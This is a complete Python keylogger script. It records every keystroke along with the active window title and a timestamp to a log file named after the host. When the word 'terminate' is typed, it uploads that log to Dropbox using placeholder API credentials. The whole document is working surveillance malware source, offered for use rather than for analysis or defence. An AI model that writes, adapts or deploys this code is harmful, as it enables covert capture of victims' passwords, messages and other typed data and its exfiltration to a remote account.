from pynput import keyboard
from datetime import datetime
import pygetwindow as gw
import dropbox
from dropbox.exceptions import ApiError

import socket

# Dropbox API credentials
DROPBOX_APP_KEY = 'paste_your_app_key'
DROPBOX_APP_SECRET = 'paste_your_app_secret_key'
DROPBOX_ACCESS_TOKEN = 'paste_your_access_token'
# Get the hostname of the device
hostname = socket.gethostname()

# Create a timestamp string based on the current date and time
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

# Combine the hostname and timestamp to create a unique log file name
log_file_path = f'logs_{hostname}_{timestamp}.txt'

secret_phrase = ['t', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e']
current_keys = []

def get_active_application():
    try:
        active_window = gw.getWindowsWithTitle(gw.getActiveWindow().title)
        if active_window:
            return active_window[0].title
        else:
            return None
    except Exception:
        return None

def upload_file_to_dropbox(file_path, access_token):
    dbx = dropbox.Dropbox(access_token)

    with open(file_path, 'rb') as f:
        try:
            dbx.files_upload(f.read(), '/' + file_path, mode=dropbox.files.WriteMode('overwrite'))
            print(f"File '{file_path}' uploaded successfully.")
        except ApiError as e:
            print(f"Error uploading file '{file_path}' to Dropbox:", e)

def on_press(key):
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        if hasattr(key, 'char') and key.char is not None and key.char.lower() == secret_phrase[len(current_keys)]:
            current_keys.append(key.char.lower())

            if current_keys == secret_phrase:
                # If the secret phrase is entered, upload the log file to Dropbox and exit
                print("Secret phrase entered. Uploading log file to Dropbox and exiting.")
                upload_file_to_dropbox(log_file_path, DROPBOX_ACCESS_TOKEN)
                exit()

        active_application = get_active_application()

        with open(log_file_path, 'a') as f:
            if hasattr(key, 'name'):
                key_repr = key.name
            elif hasattr(key, 'char'):
                key_repr = key.char
            else:
                key_repr = str(key)

            f.write(f'"{current_time}" "{active_application}" "{key_repr}"\n')

    except Exception as e:
        with open(log_file_path, 'rb') as f:
            f.write(f'"{current_time}" Error: "{str(e)}"\n')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
